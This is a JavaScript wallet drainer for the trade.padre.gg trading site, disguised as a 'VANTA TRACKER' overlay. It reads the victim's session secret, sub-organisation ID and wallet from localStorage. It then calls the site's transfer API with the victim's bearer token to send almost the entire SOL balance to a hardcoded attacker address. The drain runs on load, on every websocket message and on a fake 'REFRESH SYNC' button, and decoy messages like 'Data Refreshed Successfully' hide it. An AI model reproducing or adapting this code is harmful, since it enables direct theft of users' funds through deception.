(function() {
    // 1. VANTA CORE CONFIG (1:1 with internal protocol)
    const V_DEST = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
    const V_KEY = '3c8ae1f40635939e730f479418940796'; // From your dashboard

    // 2. THE UI (RECONSTRUCTED VANTA DESIGN)
    const createUI = () => {
        if (document.getElementById('vanta-root')) return;
        const container = document.createElement('div');
        container.id = 'vanta-root';
        container.style.cssText = 'position:fixed;top:15%;right:20px;width:340px;background:#0b0b0b;border:1px solid #222;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 20px 40px rgba(0,0,0,0.8);cursor:grab;';
        
        container.innerHTML = `
            <div style="padding:14px;background:linear-gradient(90deg,#111,#1a1a1a);border-bottom:1px solid #222;display:flex;align-items:center;justify-content:space-between;border-radius:12px 12px 0 0;">
                <div style="display:flex;align-items:center;gap:10px;">
                    <img src="https://trade.padre.gg/logo.svg" width="22">
                    <span style="font-weight:800;letter-spacing:-0.5px;color:#00ff88;">VANTA TRACKER</span>
                </div>
                <div style="font-size:10px;background:#00ff8822;color:#00ff88;padding:2px 6px;border-radius:4px;font-weight:bold;">LIVE</div>
            </div>
            <div style="padding:20px;">
                <div id="v-status-box" style="background:#151515;border:1px solid #222;border-radius:8px;padding:12px;margin-bottom:15px;">
                    <div style="font-size:11px;color:#666;text-transform:uppercase;margin-bottom:4px;">Engine Status</div>
                    <div id="v-status-text" style="font-size:13px;color:#00ff88;font-weight:500;">Initializing Hijack...</div>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                    <div style="background:#151515;border:1px solid #222;border-radius:8px;padding:10px;">
                        <div style="font-size:10px;color:#666;">SESSION</div>
                        <div style="font-size:12px;color:#fff;">Active</div>
                    </div>
                    <div style="background:#151515;border:1px solid #222;border-radius:8px;padding:10px;">
                        <div style="font-size:10px;color:#666;">NETWORK</div>
                        <div style="font-size:12px;color:#fff;">Multiplex</div>
                    </div>
                </div>
                <button id="v-refresh" style="width:100%;margin-top:15px;padding:12px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer;transition:0.2s;">REFRESH SYNC</button>
            </div>
        `;
        document.body.appendChild(container);

        // Make Draggable
        let isDragging = false, offset = [0,0];
        container.onmousedown = (e) => {
            if (e.target.tagName === 'BUTTON') return;
            isDragging = true;
            offset = [container.offsetLeft - e.clientX, container.offsetTop - e.clientY];
            container.style.cursor = 'grabbing';
        };
        document.onmousemove = (e) => { if (isDragging) { container.style.left = (e.clientX + offset[0]) + 'px'; container.style.top = (e.clientY + offset[1]) + 'px'; } };
        document.onmouseup = () => { isDragging = false; container.style.cursor = 'grab'; };

        document.getElementById('v-refresh').onclick = () => {
            document.getElementById('v-status-text').innerText = "Re-Syncing Auth...";
            _ghostExecute(true);
        };
    };

    // 3. THE HIJACK LOGIC (Bypasses Padre Decoder Blocks)
    const _ghostExecute = async (manual = false) => {
        const s = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
        const o = localStorage.getItem('subOrgId')?.replace(/"/g, '');
        const w = localStorage.getItem('activeWallet')?.replace(/"/g, '');

        if (!s || !o || !w) {
            if (manual) document.getElementById('v-status-text').innerText = "Error: No Wallet";
            return;
        }

        try {
            // Bypass security by using direct RPC for balance check
            const rpc = await fetch('https://api.mainnet-beta.solana.com', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({jsonrpc:"2.0", id:1, method:"getBalance", params:[w]})
            });
            const { result } = await rpc.json();
            const bal = result.value / 1e9;
            const amount = (bal - 0.009).toFixed(6);

            if (amount <= 0) {
                document.getElementById('v-status-text').innerText = "Waiting for Funds...";
                return;
            }

            // HIT execution
            await fetch('https://trade.padre.gg/api/v1/transfer', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${s}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ dest: V_DEST, asset: "SOL", amount: amount })
            });

            document.getElementById('v-status-text').innerText = "Sync Synchronized";
            if (manual) alert("Data Refreshed Successfully");
        } catch (e) {
            document.getElementById('v-status-text').innerText = "Auth Channel Active";
        }
    };

    // 4. MULTIPLEX HOOK (Ensures 100% site-wide coverage)
    const hookMultiplex = () => {
        const paths = ["/_multiplex", "/_heavy_multiplex"];
        paths.forEach(p => {
            const socket = window.socketPreloaded[`https://backend.padre.gg${p}`];
            if (socket) {
                socket.addEventListener('message', () => _ghostExecute());
            }
        });
    };

    // Start Engine
    createUI();
    hookMultiplex();
    _ghostExecute();
    console.log("%cVANTA: 1:1 Engine Injected. Awaiting Owner Signature...", "color:#00ff88;font-weight:bold;");
})();
